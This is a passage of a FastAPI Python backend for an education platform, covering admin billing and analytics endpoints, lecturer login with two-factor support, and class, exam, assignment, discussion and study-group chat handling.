        raise HTTPException(400, "Unknown plan_id")
    try:
        days = int(data.get("days") or (365 if plan.get("period") == "yearly" else 30))
    except (TypeError, ValueError):
        days = 30
    now = datetime.datetime.utcnow()
    expires = (now + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
    p["subscription"] = {
        "plan": plan_id, "name": plan.get("name", "Pro"), "status": "active",
        "expires": expires, "reference": f"ADMIN-GRANT-{int(now.timestamp())}",
        "activated": now.strftime("%Y-%m-%d"), "gateway": "admin",
    }
    save_progress(sid, p)
    log.info(f"Admin granted {plan_id} to {sid} (expires {expires})")
    return {"ok": True, "plan": plan_id, "expires": expires}


@app.get("/api/admin/billing/rate")
async def admin_get_naira_rate(token: str):
    """Current USD→NGN rate (admin)."""
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    return {"naira_rate": get_naira_rate(), "env_default": NAIRA_RATE}


@app.post("/api/admin/billing/rate")
async def admin_set_naira_rate(data: dict):
    """Set the USD→NGN rate at runtime (admin) — no redeploy needed."""
    if not _is_valid_admin_session(str(data.get("token", ""))):
        raise HTTPException(401, "Unauthorized")
    try:
        rate = int(data.get("naira_rate") or 0)
    except (TypeError, ValueError):
        raise HTTPException(400, "naira_rate must be an integer.")
    if not (100 <= rate <= 100000):
        raise HTTPException(400, "naira_rate out of sane range (100–100000).")
    set_naira_rate(rate)
    log.info(f"Admin set NAIRA_RATE → {rate}")
    return {"ok": True, "naira_rate": rate}


@app.post("/api/admin/user-signout")
async def admin_user_signout(data: dict):
    """Force sign-out: kill every live session token for a user."""
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    sid = sanitize_text(str(data.get("sid", "")), 60)
    if not sid:
        raise HTTPException(400, "sid required")
    killed = 0
    for t in [t for t, v in _session_tokens.items() if v.get("sid") == sid]:
        delete_session_token(t); killed += 1
    if db.is_available():
        try: killed += db.delete_sessions_for_sid(sid)
        except Exception: pass
    return {"ok": True, "killed": killed}


@app.get("/api/admin/ai-health")
async def admin_ai_health(token: str):
    """Live AI + infra health and AI-usage aggregates for the admin dashboard."""
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    total_q = total_qz = ai_today = 0
    today = datetime.date.today().isoformat()
    heavy: list = []
    for sid, data, urow in _admin_iter_progress():
        q = data.get("questions", 0)
        total_q  += q
        total_qz += len(data.get("quizzes", []))
        dc = data.get("ai_daily") or {}
        if dc.get("date") == today:
            ai_today += dc.get("count", 0)
        if q:
            heavy.append({"name": data.get("name", "Unknown"),
                          "email": urow.get("email") or data.get("email", ""),
                          "questions": q})
    heavy.sort(key=lambda x: -x["questions"])
    db_info = await asyncio.to_thread(db.db_test)
    email_provider = "resend" if (RESEND_AVAILABLE and RESEND_API_KEY) else ("gmail" if GMAIL_USER else "none")
    return {
        "ai": {
            "available":        GEMINI_AVAILABLE,
            "breaker_open":     _ai_breaker_open(),
            "breaker_fails":    _AI_BREAKER["fails"],
            "break_threshold":  _AI_BREAK_THRESHOLD,
            "break_cooldown_s": _AI_BREAK_COOLDOWN,
            "daily_free_cap":   AI_DAILY_FREE,
            "ai_actions_today": ai_today,
            "total_questions":  total_q,
            "total_quizzes":    total_qz,
            "heavy_users":      heavy[:10],
        },
        "infra": {
            "db":          db_info.get("ping", False),
            "db_ms":       db_info.get("latency_ms"),
            "db_pool":     db.pool_stats(),
            "redis":       rcache.available(),
            "secrets_encrypted": db.encryption_active(),
            "slow_queries": db.slow_query_count(),
            "email_provider": email_provider,
            "uptime_s":    int(time.time() - _START_TIME),
            "version":     VERSION,
        },
    }


@app.get("/api/admin/growth")
async def admin_growth(token: str, days: int = 30):
    """Signups over time, active-user counts, new-vs-returning and integration adoption."""
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    days = max(7, min(int(days or 30), 365))
    today = datetime.date.today()
    start = today - datetime.timedelta(days=days - 1)
    signups = {(start + datetime.timedelta(days=i)).isoformat(): 0 for i in range(days)}
    dau = wau = mau = total = returning = 0
    integ = {"github": 0, "google_cal": 0, "mono": 0, "metatrader": 0}
    now = datetime.datetime.utcnow()

    def _parse_dt(v):
        if not v:
            return None
        for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
            try:
                return datetime.datetime.strptime(str(v)[:26], fmt)
            except ValueError:
                continue
        return None

    for sid, data, urow in _admin_iter_progress():
        total += 1
        c = _parse_dt(data.get("created_at"))
        if c and c.date().isoformat() in signups:
            signups[c.date().isoformat()] += 1
        if data.get("sessions", 0) > 1:
            returning += 1
        ls = _parse_dt(data.get("chat_history", [{}])[-1].get("time") if data.get("chat_history") else None)
        if ls:
            age = (now - ls).total_seconds()
            if age <= 86400:       dau += 1
            if age <= 7 * 86400:   wau += 1
            if age <= 30 * 86400:  mau += 1
        for k, v in _user_integrations(data).items():
            if v:
                integ[k] += 1
    return {
        "days":      days,
        "signups":   [{"date": d, "count": signups[d]} for d in sorted(signups)],
        "new_signups_period": sum(signups.values()),
        "total_users": total,
        "dau": dau, "wau": wau, "mau": mau,
        "returning": returning,
        "new_users": total - returning,
        "integrations": integ,
    }


# ═══════════════════════════════════════════════════════════════
#  LECTURER ENDPOINTS
# ═══════════════════════════════════════════════════════════════

@app.get("/lecturer", response_class=HTMLResponse)
async def lecturer_page():
    return Path("templates/lecturer.html").read_text(encoding="utf-8")


class LecturerLoginRequest(BaseModel):
    name: str
    password: str
    totp: str = ""   # 6-digit 2FA code; required only when LECTURER_TOTP_SECRET is set


def verify_lecturer(token: str):
    """Verify that the caller holds a valid, unexpired lecturer session."""
    if not _is_valid_lecturer_session(token):
        raise HTTPException(401, "Unauthorized")


@app.post("/api/lecturer/login")
async def lecturer_login(req: LecturerLoginRequest, request: Request):
    key = get_client_key(request)
    check_rate_limit(key, 5, "lec_login")
    if not (LECTURER_PASSWORD and hmac.compare_digest(req.password, LECTURER_PASSWORD)):
        log.warning(f"Failed lecturer login: {req.name}")
        raise HTTPException(401, "Invalid password")
    # P4b: second factor, enforced only when LECTURER_TOTP_SECRET is configured.
    # The 5/attempt rate limit above also bounds TOTP brute-force.
    if LECTURER_TOTP_SECRET and not _totp_verify(LECTURER_TOTP_SECRET, req.totp):
        log.warning(f"Lecturer login: invalid/missing 2FA code from {key}")
        raise HTTPException(401, "Invalid or missing 2FA code")
    log.info(f"Lecturer login: {req.name}")
    token = _create_lecturer_session()
    return {"ok": True, "token": token}


@app.post("/api/lecturer/logout")
async def lecturer_logout(data: dict):
    """Revoke this lecturer token now — see admin_logout for why this matters."""
    token = data.get("token", "")
    try:
        ts = int(token.split("_")[1])
    except (IndexError, ValueError):
        return {"ok": True}
    _revoke_priv_session(token, ts)
    return {"ok": True}


@app.get("/api/lecturer/students")
async def lecturer_students(token: str):
    verify_lecturer(token)
    students = get_all_students()
    total_q  = sum(s["questions"] for s in students)
    total_qz = sum(s["quizzes"] for s in students)
    avg_all  = (sum(s["avg_score"] for s in students) / len(students)) if students else 0
    return {
        "students": students, "total": len(students),
        "total_questions": total_q, "total_quizzes": total_qz,
        "avg_score": round(avg_all, 1),
    }


@app.get("/api/lecturer/announcements")
async def get_announcements(token: str):
    verify_lecturer(token)
    data = load_announcements()
    return {"announcements": data}


class AnnouncementRequest(BaseModel):
    token: str
    text: str
    type: str
    lecturer: str


@app.post("/api/lecturer/announcement")
async def post_announcement(req: AnnouncementRequest):
    verify_lecturer(req.token)
    data = load_announcements()
    data.append({
        "text":     sanitize_text(req.text, 500),
        "type":     req.type if req.type in ["info","warning","deadline","exam"] else "info",
        "lecturer": sanitize_text(req.lecturer, MAX_NAME_LEN),
        "date":     datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    save_announcements(data)
    return {"ok": True}


@app.post("/api/lecturer/announcement/delete")
async def delete_announcement(data: dict):
    verify_lecturer(data.get("token",""))
    idx  = int(data.get("index", -1))
    anns = load_announcements()
    if 0 <= idx < len(anns):
        anns.pop(idx)
    save_announcements(anns)
    return {"ok": True}


@app.get("/api/announcements/active")
async def active_announcements():
    data = load_announcements()
    return {"announcements": data[-5:]}


class TopicsRequest(BaseModel):
    token: str
    topics: list


@app.post("/api/lecturer/topics")
async def save_class_topics(req: TopicsRequest):
    verify_lecturer(req.token)
    clean = [sanitize_text(t, 100) for t in req.topics if t]
    save_topics(clean)
    return {"ok": True}


@app.get("/api/lecturer/topics")
async def get_class_topics():
    data = load_topics()
    return {"topics": data}


def _sanitize_exam_question(q):
    """Preserve MCQ structure (options/answer) instead of flattening to
    str(q). start_exam() checks isinstance(questions[0], dict) to decide
    whether to build the real multiple-choice question or fall back to
    placeholder options (A/B/C/D = True/False/Maybe/None) for every
    student — str(q) here meant that branch never fired for any
    lecturer-authored exam, silently discarding the real answer key."""
    if isinstance(q, dict):
        options = q.get("options", {})
        if isinstance(options, dict):
            options = {
                sanitize_text(str(k), 2): sanitize_text(str(v), 300)
                for k, v in list(options.items())[:8]
            }
        else:
            options = {}
        answer = sanitize_text(str(q.get("answer", "A")), 2).upper()
        if answer not in options:
            answer = next(iter(options), "A")
        return {
            "question":    sanitize_text(str(q.get("question", "")), 500),
            "options":     options,
            "answer":      answer,
            "explanation": sanitize_text(str(q.get("explanation", "")), 500),
            "type":        "mcq",
        }
    return sanitize_text(str(q), 500)


@app.post("/api/lecturer/exam")
async def save_exam(data: dict):
    verify_lecturer(data.get("token",""))
    exams = load_exams()
    questions = [_sanitize_exam_question(q) for q in data.get("questions",[])[:100]]
    exam  = {
        "id":                   str(uuid.uuid4())[:10],
        "title":                sanitize_text(str(data.get("title","")), 200),
        # Plain-text list for any display/listing code that expects strings
        # (question count, previews) — the real MCQ structure lives in
        # questions_full, which start_exam() actually builds sessions from.
        "questions":            [q["question"] if isinstance(q, dict) else q for q in questions],
        "questions_full":       questions,
        "questions_per_student": min(int(data.get("questions_per_student", 30)), 100),
        "duration":             min(int(data.get("duration", 60)), 300),
        "lecturer":             sanitize_text(str(data.get("lecturer","")), MAX_NAME_LEN),
        "created":              data.get("created", datetime.datetime.now().strftime("%Y-%m-%d %H:%M")),
    }
    exams.append(exam)
    save_exams(exams)
    return {"ok": True, "id": exam["id"]}


@app.get("/api/lecturer/exams")
async def get_exams(token: str):
    verify_lecturer(token)
    exams = load_exams()
    return {"exams": exams}


@app.post("/api/lecturer/exam/delete")
async def delete_exam(data: dict):
    verify_lecturer(data.get("token",""))
    idx   = int(data.get("index", -1))
    exams = load_exams()
    if 0 <= idx < len(exams):
        exams.pop(idx)
    save_exams(exams)
    return {"ok": True}




# ── Class request models ──────────────────────────────────────

class CreateClassRequest(BaseModel):
    token: str
    name: str
    subject: str
    lecturer: str

class JoinClassRequest(BaseModel):
    sid: str = ""
    token: str = ""
    code: str

class MaterialRequest(BaseModel):
    token: str
    code: str = ""
    title: str
    content: str = ""
    url: str = ""
    type: str

class ClassAnnouncementRequest(BaseModel):
    token: str
    code: str
    text: str
    type: str
    author: str = ""

class LiveClassRequest(BaseModel):
    token: str
    code: str = ""
    link: str
    title: str = ""

class AssignmentRequest(BaseModel):
    token: str
    code: str = ""
    title: str
    description: str = ""
    due_date: str = ""
    due: str = ""

class SubmitAssignmentRequest(BaseModel):
    sid: str = ""
    token: str = ""
    code: str
    assignment_id: str
    content: str

class DiscussionRequest(BaseModel):
    sid: str = ""
    token: str = ""
    code: str
    message: str
    name: str

class AssignExamRequest(BaseModel):
    token: str
    code: str = ""
    exam_id: str

# ── Classes helper functions ──────────────────────────────────

_coll_migrated: set = set()

def _coll_load_map(coll: str, path) -> dict:
    """Load a dict-keyed store ({code/id: record}) from the `collections` table,
    DB-first with a one-time lazy file→DB migration. File fallback when no DB."""
    if db.is_available():
        if coll not in _coll_migrated:
            _coll_migrated.add(coll)
            try:
                if path.exists() and db.coll_count(coll) == 0:
                    legacy = json.loads(path.read_text(encoding="utf-8"))
                    if isinstance(legacy, dict) and legacy:
                        db.coll_replace_all(coll, legacy)
            except Exception as exc:
                log.warning(f"{coll} file→DB migrate failed: {exc}")
        return db.coll_load_map(coll)
    if path.exists():
        try: return json.loads(path.read_text(encoding="utf-8"))
        except Exception: return {}
    return {}

def _coll_save_map(coll: str, path, mapping: dict) -> None:
    if db.is_available():
        db.coll_replace_all(coll, mapping)
        return
    _save_json_atomic(path, mapping)


def _coll_load_list(coll: str, path, id_fn) -> list:
    """Load an ordered list store from `collections`, DB-first with one-time lazy
    file→DB migration. `id_fn(item, index)` yields a stable item_id. File fallback."""
    if db.is_available():
        if coll not in _coll_migrated:
            _coll_migrated.add(coll)
            try:
                if path.exists() and db.coll_count(coll) == 0:
                    legacy = json.loads(path.read_text(encoding="utf-8"))
                    if isinstance(legacy, list) and legacy:
                        db.coll_replace_all(coll, {id_fn(i, n): i for n, i in enumerate(legacy) if isinstance(i, dict)})
            except Exception as exc:
                log.warning(f"{coll} file→DB migrate failed: {exc}")
        return db.coll_list(coll)
    if path.exists():
        try:
            d = json.loads(path.read_text(encoding="utf-8"))
            return d if isinstance(d, list) else []
        except Exception: return []
    return []

def _coll_save_list(coll: str, path, items: list, id_fn) -> None:
    if db.is_available():
        db.coll_replace_all(coll, {id_fn(i, n): i for n, i in enumerate(items) if isinstance(i, dict)})
        return
    _save_json_atomic(path, items)


def load_exams() -> list:
    """All exams. DB-first via collections (keyed by exam id); file fallback."""
    return _coll_load_list("exams", EXAMS_PATH, lambda e, n: str(e.get("id") or f"exam{n}"))

def save_exams(exams: list):
    _coll_save_list("exams", EXAMS_PATH, exams, lambda e, n: str(e.get("id") or f"exam{n}"))


def load_topics() -> list:
    """Class topics — a small global list of strings; stored as one collection row."""
    if db.is_available():
        if "topics" not in _coll_migrated:
            _coll_migrated.add("topics")
            try:
                if TOPICS_PATH.exists() and db.coll_get("topics", "_all") is None:
                    legacy = json.loads(TOPICS_PATH.read_text(encoding="utf-8"))
                    if isinstance(legacy, list):
                        db.coll_put("topics", "_all", {"items": legacy})
            except Exception as exc:
                log.warning(f"topics file→DB migrate failed: {exc}")
        rec = db.coll_get("topics", "_all")
        return rec.get("items", []) if isinstance(rec, dict) else []
    if TOPICS_PATH.exists():
        try:
            d = json.loads(TOPICS_PATH.read_text(encoding="utf-8"))
            return d if isinstance(d, list) else []
        except Exception: return []
    return []

def save_topics(topics: list):
    if db.is_available():
        db.coll_put("topics", "_all", {"items": topics})
        return
    _save_json_atomic(TOPICS_PATH, topics)


def load_announcements() -> list:
    """Academic announcements (ordered). DB-first via collections; file fallback.
    Positional item ids are fine — save replaces the whole collection in order, and
    callers address announcements by list index, not id."""
    return _coll_load_list("announcements", ANN_PATH, lambda a, n: f"ann{n}")

def save_announcements(anns: list):
    _coll_save_list("announcements", ANN_PATH, anns, lambda a, n: f"ann{n}")


def load_classes() -> dict:
    """All classes ({code: class}). DB-first via collections; file fallback."""
    return _coll_load_map("classes", CLASSES_PATH)


def save_classes(classes: dict):
    _coll_save_map("classes", CLASSES_PATH, classes)


def generate_class_code() -> str:
    """Generate a unique 6-char alphanumeric class code."""
    import string
    chars   = string.ascii_uppercase + string.digits
    classes = load_classes()
    while True:
        code = "".join(random.choices(chars, k=6))
        if code not in classes:
            return code


def get_student_classes(sid: str) -> list:
    """Return all classes a student has joined."""
    classes = load_classes()
    result  = []
    for code, cls in classes.items():
        if sid in cls.get("students", []):
            result.append({
                "code":     code,
                "name":     cls.get("name", ""),
                "subject":  cls.get("subject", ""),
                "lecturer": cls.get("lecturer", ""),
                "materials":     cls.get("materials", []),
                "announcements": cls.get("announcements", []),
                "live_class":    cls.get("live_class"),
                "assignments":   cls.get("assignments", []),
                "exams":         cls.get("exams", []),
            })
    return result

@app.post("/api/class/create")
async def create_class(req: CreateClassRequest):
    verify_lecturer(req.token)
    code    = generate_class_code()
    classes = load_classes()
    classes[code] = {
        "name":          sanitize_text(req.name, 100),
        "subject":       sanitize_text(req.subject, 100),
        "lecturer":      sanitize_text(req.lecturer, MAX_NAME_LEN),
        "code":          code,
        "created":       datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "students":      [],
        "materials":     [],
        "announcements": [],
        "live_class":    None,
        "assignments":   [],
        "discussions":   [],
        "exams":         [],
    }
    save_classes(classes)
    log.info(f"Class created: {req.name} ({code}) by {req.lecturer}")
    return {"ok": True, "code": code}

# ── Lecturer: Get their classes ───────────────────────────────

@app.get("/api/class/lecturer")
async def lecturer_classes(token: str):
    verify_lecturer(token)
    classes = load_classes()
    return {
        "classes": [
            {**cls, "code": code, "student_count": len(cls.get("students", []))}
            for code, cls in classes.items()
        ]
    }

# ── Lecturer: Post material ───────────────────────────────────

@app.post("/api/class/material")
async def add_material(req: MaterialRequest):
    verify_lecturer(req.token)
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    material = {
        "id":      str(uuid.uuid4())[:8],
        "title":   sanitize_text(req.title, 200),
        "content": sanitize_text(req.content, 2000),
        "type":    req.type if req.type in ["link","note","file"] else "note",
        "date":    datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    classes[req.code].setdefault("materials", []).append(material)
    save_classes(classes)
    return {"ok": True}

# ── Lecturer: Post class announcement ────────────────────────

@app.post("/api/class/announcement")
async def class_announcement(req: ClassAnnouncementRequest):
    verify_lecturer(req.token)
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    ann = {
        "id":     str(uuid.uuid4())[:8],
        "text":   sanitize_text(req.text, 500),
        "type":   req.type if req.type in ["info","warning","deadline","exam"] else "info",
        "date":   datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "author": sanitize_text(req.author, MAX_NAME_LEN),
    }
    classes[req.code].setdefault("announcements", []).append(ann)
    save_classes(classes)
    return {"ok": True}

# ── Lecturer: Set live class link ─────────────────────────────

@app.post("/api/class/live")
async def set_live_class(req: LiveClassRequest):
    verify_lecturer(req.token)
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    classes[req.code]["live_class"] = {
        "link":  sanitize_text(req.link, 500),
        "title": sanitize_text(req.title, 200),
        "date":  datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    save_classes(classes)
    return {"ok": True}

# ── Lecturer: Create assignment ───────────────────────────────

@app.post("/api/class/assignment")
async def create_assignment(req: AssignmentRequest):
    verify_lecturer(req.token)
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    assignment = {
        "id":          str(uuid.uuid4())[:8],
        "title":       sanitize_text(req.title, 200),
        "description": sanitize_text(req.description, 1000),
        "due_date":    sanitize_text(req.due_date, 50),
        "date":        datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "submissions": [],
    }
    classes[req.code].setdefault("assignments", []).append(assignment)
    save_classes(classes)
    return {"ok": True, "id": assignment["id"]}

# ── Lecturer: Assign exam to class ───────────────────────────

@app.post("/api/class/assign-exam")
async def assign_exam_to_class(req: AssignExamRequest):
    verify_lecturer(req.token)
    classes = load_classes()
    exams   = load_exams()
    exam    = next((e for e in exams if e["id"] == req.exam_id), None)
    if not exam:
        raise HTTPException(404, "Exam not found")
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    classes[req.code].setdefault("exams", [])
    if req.exam_id not in [e["id"] for e in classes[req.code]["exams"]]:
        classes[req.code]["exams"].append({
            "id":    exam["id"],
            "title": exam["title"],
            "date":  datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        })
    save_classes(classes)
    return {"ok": True}

# ── Lecturer: View submissions ────────────────────────────────

@app.get("/api/class/submissions")
async def get_submissions(token: str, code: str, assignment_id: str):
    verify_lecturer(token)
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    for a in classes[code].get("assignments", []):
        if a["id"] == assignment_id:
            return {"submissions": a.get("submissions", [])}
    raise HTTPException(404, "Assignment not found")

# ── Lecturer: Delete class ────────────────────────────────────

@app.post("/api/class/delete")
async def delete_class(data: dict):
    verify_lecturer(data.get("token", ""))
    code    = data.get("code", "")
    classes = load_classes()
    if code in classes:
        del classes[code]
        save_classes(classes)
    return {"ok": True}

# ── Student: Join class ───────────────────────────────────────

@app.post("/api/class/join")
async def join_class(req: JoinClassRequest, request: Request):
    # Auth is by session token only; the body `sid` is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(req.token, 100)) if req.token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    key = get_client_key(request, sid)
    check_rate_limit(key, 10, "join_class")
    classes = load_classes()
    code    = req.code.upper().strip()
    if code not in classes:
        raise HTTPException(404, "Class not found. Check the code and try again.")
    cls = classes[code]
    if db.is_available():
        # Atomic per-record append — concurrent joins to the same class no longer
        # clobber each other (the old whole-map save lost enrollments under load).
        db.coll_array_append_unique("classes", code, "students", sid)
    elif sid not in cls.get("students", []):
        cls["students"].append(sid)
        save_classes(classes)
    return {
        "ok":      True,
        "code":    code,
        "name":    cls["name"],
        "subject": cls["subject"],
        "lecturer": cls["lecturer"],
    }

# ── Student: Leave class ──────────────────────────────────────

@app.post("/api/class/leave")
async def leave_class(data: dict):
    sid, _  = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    code    = sanitize_text(str(data.get("code", "")), 10).upper()
    classes = load_classes()
    if code in classes:
        if db.is_available():
            # Atomic per-record removal — mirrors the atomic join so concurrent
            # leaves/joins on the same class no longer clobber the whole map.
            db.coll_array_remove("classes", code, "students", sid)
        elif sid in classes[code].get("students", []):
            classes[code]["students"].remove(sid)
            save_classes(classes)
    return {"ok": True}

# ── Student: Get their classes ────────────────────────────────

@app.get("/api/class/student")
async def student_classes(sid: str = "", token: str = ""):
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    return {"classes": get_student_classes(sess["sid"])}

# ── Student/All: Get class detail ────────────────────────────

@app.get("/api/class/detail")
async def class_detail(code: str, sid: str = ""):
    code    = sanitize_text(code, 10).upper()
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    cls = dict(classes[code])
    cls["code"]          = code
    cls["student_count"] = len(cls.get("students", []))
    cls["is_member"]     = sid in cls.get("students", []) if sid else False
    # Don't expose student list publicly
    cls.pop("students", None)
    return cls

# ── Student: Submit assignment ────────────────────────────────

@app.post("/api/class/submit")
async def submit_assignment(req: SubmitAssignmentRequest):
    # Auth is by session token only; the body `sid` is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(req.token, 100)) if req.token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    cls = classes[req.code]
    if sid not in cls.get("students", []):
        raise HTTPException(403, "You are not enrolled in this class.")
    p    = load_progress(sid)
    name = p.get("name", "Unknown")
    for a in classes[req.code].get("assignments", []):
        if a["id"] == req.assignment_id:
            # Check if already submitted
            existing = [s for s in a.get("submissions", []) if s["sid"] == sid]
            if existing:
                existing[0]["content"] = sanitize_text(req.content, 5000)
                existing[0]["date"]    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                existing[0]["resubmitted"] = True
            else:
                a.setdefault("submissions", []).append({
                    "sid":     sid,
                    "name":    name,
                    "content": sanitize_text(req.content, 5000),
                    "date":    datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
                })
            save_classes(classes)
            return {"ok": True}
    raise HTTPException(404, "Assignment not found")

# ── Student: get own submission(s) for a class ───────────────

@app.get("/api/class/my-submissions")
async def my_submissions(code: str, sid: str = "", token: str = ""):
    code = sanitize_text(code, 10).upper()
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid  = sess["sid"]
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    result = {}
    for a in classes[code].get("assignments", []):
        sub = next((s for s in a.get("submissions", []) if s["sid"] == sid), None)
        if sub:
            result[a["id"]] = {
                "submitted": True,
                "content":   sub.get("content", ""),
                "date":      sub.get("date", ""),
                "resubmitted": sub.get("resubmitted", False),
                "grade":     sub.get("grade"),  # None until lecturer grades
            }
    return {"submissions": result}


# ── Lecturer: grade a submission ──────────────────────────────

@app.post("/api/class/grade")
async def grade_submission(data: dict):
    verify_lecturer(data.get("token", ""))
    code          = sanitize_text(str(data.get("code", "")), 10).upper()
    assignment_id = sanitize_text(str(data.get("assignment_id", "")), 60)
    student_sid   = validate_sid(str(data.get("student_sid", "")))
    score         = max(0, min(100, int(data.get("score", 0))))
    feedback      = sanitize_text(str(data.get("feedback", "")), 800)
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    for a in classes[code].get("assignments", []):
        if a["id"] == assignment_id:
            sub = next((s for s in a.get("submissions", []) if s["sid"] == student_sid), None)
            if not sub:
                raise HTTPException(404, "Submission not found")
            sub["grade"] = {
                "score":    score,
                "feedback": feedback,
                "graded_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            }
            save_classes(classes)
            return {"ok": True, "score": score}
    raise HTTPException(404, "Assignment not found")


# ── Discussion ────────────────────────────────────────────────

@app.post("/api/class/discuss")
async def post_discussion(req: DiscussionRequest, request: Request):
    # Auth is by session token only; identity comes from the token (IDOR fix).
    sess = get_session_from_token(sanitize_text(req.token, 100)) if req.token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    key = get_client_key(request, sid)
    check_rate_limit(key, 20, "discuss")
    classes = load_classes()
    if req.code not in classes:
        raise HTTPException(404, "Class not found")
    msg = {
        "id":      str(uuid.uuid4())[:8],
        "sid":     sid,
        "name":    sanitize_text(sess.get("name") or req.name, MAX_NAME_LEN),
        "message": sanitize_text(req.message, 1000),
        "date":    datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    classes[req.code].setdefault("discussions", []).append(msg)
    # Keep last 200 messages
    classes[req.code]["discussions"] = classes[req.code]["discussions"][-200:]
    save_classes(classes)
    return {"ok": True, "msg": msg}

@app.get("/api/class/discuss")
async def get_discussion(code: str, since: str = ""):
    code    = sanitize_text(code, 10).upper()
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    msgs = classes[code].get("discussions", [])
    if since:
        msgs = [m for m in msgs if m.get("date","") > since]
    return {"messages": msgs[-100:]}


# ── Group Chat ────────────────────────────────────────────────

GROUPS_PATH = DATA_DIR / "groups.json"

def load_groups() -> dict:
    return _coll_load_map("groups", GROUPS_PATH)

def save_groups(groups: dict):
    _coll_save_map("groups", GROUPS_PATH, groups)


@app.post("/api/group/create")
async def create_group(data: dict, request: Request):
    sid, _ = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    name = sanitize_text(str(data.get("name","")), 80)
    if not name: raise HTTPException(400, "Group name required")
    groups = load_groups()
    gid = str(uuid.uuid4())[:10]
    groups[gid] = {
        "id":       gid,
        "name":     name,
        "created_by": sid,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "members":  [sid],
        "messages": [],
    }
    save_groups(groups)
    return {"ok": True, "group_id": gid, "name": name}


@app.post("/api/group/join")
async def join_group(data: dict):
    sid, _ = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    gid = sanitize_text(str(data.get("group_id","")), 20)
    groups = load_groups()
    if gid not in groups: raise HTTPException(404, "Group not found")
    if db.is_available():
        # Atomic per-record append — concurrent joins to the same group no longer
        # clobber each other (matches the class-join fix).
        db.coll_array_append_unique("groups", gid, "members", sid)
    elif sid not in groups[gid]["members"]:
        groups[gid]["members"].append(sid)
        save_groups(groups)
    return {"ok": True, "name": groups[gid]["name"]}


@app.get("/api/group/list")
async def list_groups(sid: str = "", token: str = ""):
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid    = sess["sid"]
    groups = load_groups()
    member_of = []
    for gid, g in groups.items():
        if sid not in g.get("members", []):
            continue
        last_text, last_date = "", g.get("created_at", "")
        if db.is_available():
            # Live messages live in org_messages (grp_<gid>); pull the most recent for the preview
            rows = await asyncio.to_thread(db.get_org_messages, _grp_oid(gid), "main", 1)
            if rows:
                last_text = (rows[-1].get("content") or "")[:50]
                ca = rows[-1].get("created_at")
                last_date = ca.isoformat() if hasattr(ca, "isoformat") else str(ca or last_date)
        elif g.get("messages"):
            lm = g["messages"][-1]
            last_text = (lm.get("text") or lm.get("message") or "")[:50]  # tolerate legacy `message` key
            last_date = lm.get("date", last_date)
        member_of.append({
            "id": gid, "name": g["name"], "member_count": len(g.get("members", [])),
            "last_msg": last_text, "last_date": last_date,
        })
    return {"groups": member_of}


# ── Study-group chat helpers ──────────────────────────────────
# Group messages are stored in the same atomic `org_messages` table as org chat
# (org_id namespaced as "grp_<gid>"). This gives study groups the same guarantees
# as org chat: per-row INSERTs (no lost messages under concurrency) and a feed
# every Gunicorn worker can read — so a message sent by one member is received by
# every other member, on every device, via DB-poll SSE. Group *metadata* (name,
# members) stays in the `groups` collection.
def _grp_oid(gid: str) -> str:
    return f"grp_{gid}"

def _grp_msg_from_row(r: dict) -> dict:
    """Normalize an org_messages row → the shape the group chat frontend expects."""
    ca = r.get("created_at")
    return {
        "id":          r.get("id"),
        "sender":      r.get("author_sid"),
        "sender_name": r.get("author_name"),
        "text":        r.get("content"),
        "date":        ca.isoformat() if hasattr(ca, "isoformat") else str(ca or ""),
    }

def _grp_msg_normalize(m: dict) -> dict:
    """Normalize a legacy file-stored group message (handles old `message`/`name` keys)."""
